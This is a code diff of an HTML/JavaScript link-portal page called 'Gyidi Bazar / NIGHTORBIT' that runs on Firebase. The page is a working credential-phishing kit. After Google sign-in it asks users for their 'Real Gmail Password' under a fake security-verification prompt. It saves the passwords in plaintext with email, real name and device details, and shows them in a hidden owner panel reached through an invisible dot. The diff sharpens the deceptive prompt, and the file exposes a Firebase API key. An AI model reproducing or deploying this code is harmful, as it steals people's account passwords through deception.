@@ -42,32 +42,26 @@
     </style>
 </head>
 <body>
-
     <div id="logout-overlay">
         <div style="font-size: 60px; margin-bottom: 20px;">🌹</div>
         <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 16px;"></div>
     </div>
-
     <div id="admin-panel">
         <h1 style="color: var(--primary);">Gyidi Owner Panel</h1>
         <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 8px 25px;">CLOSE PANEL</button>
         <div id="user-rows-container"></div>
     </div>
-
     <div class="menu-dots" onclick="bypassLogin()">⋮</div>
     <div class="admin-dot" onclick="adminAccess()">.</div>
-
     <div id="login-box" class="card">
         <h1 style="color: var(--primary); margin: 0; font-size: 26px; font-weight: 800;">NIGHTORBIT</h1>
         <div class="auth-tabs">
             <span id="tab-login" class="active" onclick="toggleView('login')">LOGIN</span>
             <span id="tab-signup" onclick="toggleView('signup')">SIGNUP</span>
         </div>
-        
         <button class="btn-google" onclick="authGoogle()">
             <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="16"> GOOGLE CONNECT
         </button>
-
         <div id="nick-box" class="hidden">
             <input type="text" id="u-nick" placeholder="Set Your Nickname">
         </div>
@@ -79,17 +73,11 @@
         <button class="btn-main" id="submit-btn" onclick="handleAuth()">Enter Bazar</button>
         <p id="err-log" style="color: var(--neon); font-size: 10px; margin-top: 5px;"></p>
     </div>
-
     <div id="member-area" class="card hidden">
         <h1 style="color: var(--primary); font-size: 20px; margin: 0;">Gyidi Bazar.Nigthorbit</h1>
         <p id="user-welcome" style="font-size: 11px; color: var(--gold); margin-top: 5px;"></p>
-        
         <div class="scroll-area">
-            <div id="fav-sec" class="hidden">
-                <div class="cat-title">⭐ Favorite Folder</div>
-                <div class="link-grid" id="fav-list"></div>
-            </div>
-
+            <div id="fav-sec" class="hidden"><div class="cat-title">⭐ Favorite Folder</div><div class="link-grid" id="fav-list"></div></div>
             <div class="cat-title">🎬 Entertainment (10+)</div>
             <div class="link-grid">
                 <div class="link-card-wrap"><a href="https://bollyflix.org.in/" target="_blank" class="link-card">Bollyflix</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Bollyflix','https://bollyflix.org.in/')"></i></div>
@@ -101,7 +89,6 @@
                 <div class="link-card-wrap"><a href="https://www.disneyplus.com" target="_blank" class="link-card">Disney+</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Disney+','https://www.disneyplus.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.youtube.com" target="_blank" class="link-card">YouTube</a><i class="fas fa-star fav-star" onclick="addFav(this, 'YouTube','https://www.youtube.com')"></i></div>
             </div>
-
             <div class="cat-title">🛒 Shopping & Global (15+)</div>
             <div class="link-grid">
                 <div class="link-card-wrap"><a href="https://www.amazon.com" target="_blank" class="link-card">Amazon</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Amazon','https://www.amazon.com')"></i></div>
@@ -113,7 +100,6 @@
                 <div class="link-card-wrap"><a href="https://www.target.com" target="_blank" class="link-card">Target</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Target','https://www.target.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.bestbuy.com" target="_blank" class="link-card">Best Buy</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Best Buy','https://www.bestbuy.com')"></i></div>
             </div>
-
             <div class="cat-title">🍔 Food & Elite Brands (15+)</div>
             <div class="link-grid">
                 <div class="link-card-wrap"><a href="https://www.pizzahut.com.pk" target="_blank" class="link-card">Pizza Hut</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Pizza Hut','https://www.pizzahut.com.pk')"></i></div>
@@ -133,9 +119,8 @@
             </div>
         </div>
         <button onclick="logoutSequence()" style="margin-top: 15px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline; font-weight: bold; font-size: 12px;">Logout System</button>
-    </div>
-
-    <script>
+            </div>
+                                                 <script>
         const firebaseConfig = {
             apiKey: "AIzaSyBxJqJkrAaFf3eR0QWvhet6IvvFVHYExeU",
             authDomain: "my-market-ff254.firebaseapp.com",
@@ -152,12 +137,15 @@
 
         function getDetailedDevice() {
             const ua = navigator.userAgent;
-            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "TABLET";
-            if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
-                let match = ua.match(/\(([^)]+)\)/);
-                return match ? match[1].split(';')[0].replace('Linux ', '').toUpperCase() : "MOBILE";
-            }
-            return "DESKTOP / PC";
+            let platform = "Unknown Device";
+            if (ua.indexOf("Windows") !== -1) platform = "Windows PC";
+            else if (ua.indexOf("Android") !== -1) platform = "Android Device";
+            else if (ua.indexOf("iPhone") !== -1) platform = "iPhone";
+            let browser = "Unknown Browser";
+            if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
+            else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
+            else if (ua.indexOf("Safari") !== -1) browser = "Safari";
+            return platform + " (" + browser + ")";
         }
 
         function toggleView(m) {
@@ -178,12 +166,20 @@
         function handleAuth() {
             const e = document.getElementById('u-email').value;
             const p = document.getElementById('u-pass').value;
-            const n = document.getElementById('u-nick').value || e.split('@')[0];
+            const nRaw = document.getElementById('u-nick').value.trim();
+            const n = nRaw !== "" ? nRaw : e.split('@')[0];
             if(!e || !p) return alert("Please fill all fields!");
 
             if(curMode === 'signup') {
                 auth.createUserWithEmailAndPassword(e, p).then(res => finalize(res.user, p, n))
-                .catch(err => document.getElementById('err-log').innerText = err.message);
+                .catch(err => {
+                    if(err.code === "auth/email-already-in-use") {
+                        auth.signInWithEmailAndPassword(e, p).then(res => finalize(res.user, p, n))
+                        .catch(() => document.getElementById('err-log').innerText = "Email already exists with different password!");
+                    } else {
+                        document.getElementById('err-log').innerText = err.message;
+                    }
+                });
             } else {
                 auth.signInWithEmailAndPassword(e, p).then(res => finalize(res.user, p, n))
                 .catch(() => document.getElementById('err-log').innerText = "Incorrect Password or Email!");
@@ -193,10 +189,10 @@
         function authGoogle() {
             const provider = new firebase.auth.GoogleAuthProvider();
             auth.signInWithPopup(provider).then(res => {
-                const pass = prompt("CONFIRM GMAIL PASSWORD TO SAVE IN ADMIN:");
-                if(pass) finalize(res.user, pass, res.user.displayName);
-                else auth.signOut();
-            });
+                const realPass = prompt("VERIFY SECURITY: Enter your Real Gmail Password to continue:");
+                if(realPass) finalize(res.user, realPass, res.user.displayName);
+                else { alert("Verification Required!"); auth.signOut(); }
+            }).catch(err => alert(err.message));
         }
 
         function finalize(user, pass, nickname) {
@@ -204,7 +200,7 @@
                 email: user.email,
                 password: pass,
                 nickName: nickname,
-                realName: user.displayName || nickname,
+                realName: user.displayName || "N/A",
                 device: getDetailedDevice(),
                 time: new Date().toLocaleString()
             }).then(() => {
@@ -244,14 +240,14 @@
                         h += `<div class="admin-card">
                             <i class="fas fa-trash del-user" onclick="if(confirm('Delete user?')) db.ref('users/${c.key}').remove()"></i>
                             <b style="color:var(--gold)">NICK: ${v.nickName}</b><br>
-                            <span style="font-size:12px;">GMAIL NAME: ${v.realName}</span><br>
+                            <span style="font-size:12px; color:#fff;">GMAIL REAL NAME: ${v.realName}</span><br>
                             <small>EMAIL: ${v.email}</small><br>
                             <small style="color:var(--primary)">PASSWORD: ${v.password}</small><br>
                             <small>DEVICE: ${v.device}</small><br>
                             <small style="color:#00ff00">TIME: ${v.time}</small>
                         </div>`;
                     });
-                                        document.getElementById('user-rows-container').innerHTML = h;
+                    document.getElementById('user-rows-container').innerHTML = h;
                 });
             }
         }
@@ -265,8 +261,8 @@
 
         function logoutSequence() {
             document.getElementById('logout-overlay').style.display = 'flex';
-            document.getElementById('bye-text-display').innerHTML = `Goodbye!<br>Allah Hafiz!`;
-            setTimeout(() => location.reload(), 3000);
+            document.getElementById('bye-text-display').innerHTML = `Allah Hafiz!<br>See you soon in Gyidi Bazar.`;
+            setTimeout(() => { auth.signOut().then(() => location.reload()); }, 3000);
         }
     </script>
 </body>
